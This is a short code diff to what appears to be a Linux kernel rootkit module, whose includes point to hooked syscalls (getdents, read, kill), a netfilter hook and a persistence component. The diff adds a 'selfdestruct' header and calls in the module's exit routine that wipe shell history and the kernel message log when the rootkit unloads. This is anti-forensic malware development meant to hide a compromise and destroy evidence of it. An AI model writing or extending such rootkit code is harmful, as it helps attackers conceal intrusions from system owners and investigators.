@@ -9,6 +9,7 @@
 #include "hooked_funcs/h_kill.h"
 #include "hooked_funcs/h_netfilter.h"
 #include "persistence.h"
+#include "selfdestruct.h"
 
 
 static __init int rootkit_init(void)
@@ -32,6 +33,9 @@ static __exit void rootkit_exit(void)
     restore_getdents();
     restore_read();
     unregister_netfilter_hook();
+    flush_history();
+    flush_dmesg();
+
     return;
 }
 
